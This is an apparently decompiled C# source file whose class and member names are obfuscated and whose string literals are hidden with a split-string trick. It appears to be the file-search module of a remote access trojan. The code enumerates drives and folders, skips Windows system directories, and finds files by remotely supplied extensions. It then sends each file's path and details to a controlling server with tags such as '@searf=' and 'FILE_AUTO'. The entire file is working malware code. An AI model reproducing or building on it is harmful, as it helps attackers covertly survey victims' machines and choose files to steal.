using System;
using System.Collections.Generic;
using System.IO;

namespace nirtbivaes;

internal class DIRZARIVF
{
	public int nirtbivaesfIndx = 0;

	public bool nirtbivaesreaging = false;

	public List<string> nirtbivaessFiles = new List<string>();

	public MEEADRM iserver;

	public List<string> nirtbivaesfExts = new List<string>();

	public List<string> nirtbivaesnotFilders = new List<string>();

	public string nirtbivaesmainPath;

	public int nirtbivaessIndx = 0;

	public string nirtbivaesfilesLogs = CEDAZRNF.nirtbivaesfilesLogs;

	public bool nirtbivaessee_Access(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void nirtbivaeslook_File(string tempStr)
	{
		iserver.nirtbivaesautCnls = false;
		nirtbivaesfExts.Clear();
		nirtbivaessFiles.Clear();
		nirtbivaesfIndx = 0;
		nirtbivaessIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				nirtbivaesfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			nirtbivaesreaging = true;
			nirtbivaessend_Search(array[1]);
			nirtbivaesreaging = false;
			iserver.nirtbivaespush_data(null, "nirtbivaes@seard=searched|nirtbivaes".Split(new char[1] { '|' })[0]);
		}
	}

	public IEnumerable<string> nirtbivaesadd_Files(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.nirtbivaesautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (nirtbivaessee_Access(text) && !nirtbivaesnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public DIRZARIVF()
	{
		nirtbivaesnotFilders.Add("clients_data|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("msocache|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("recoveDSDF|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("documents and settings|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("program files|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("windows|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("program files (x86)|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("system volume information|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("$recycle.bin|nirtbivaes".Split(new char[1] { '|' })[0]);
		nirtbivaesnotFilders.Add("programdata|nirtbivaes".Split(new char[1] { '|' })[0]);
	}

	public string nirtbivaescheck_Folder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (nirtbivaessee_Access(text2))
				{
					text = text + text2 + ">|nirtbivaes".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void nirtbivaessend_Search(string path)
	{
		try
		{
			foreach (string item in nirtbivaesadd_Files(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (nirtbivaesfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.nirtbivaesfile_info(item, ret: true);
					iserver.nirtbivaespush_data(null, "nirtbivaes@searf=|nirtbivaes".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|nirtbivaes".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.nirtbivaesautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string nirtbivaeslookup_File(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|nirtbivaes".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string nirtbivaeslookup_Drives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|nirtbivaes".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
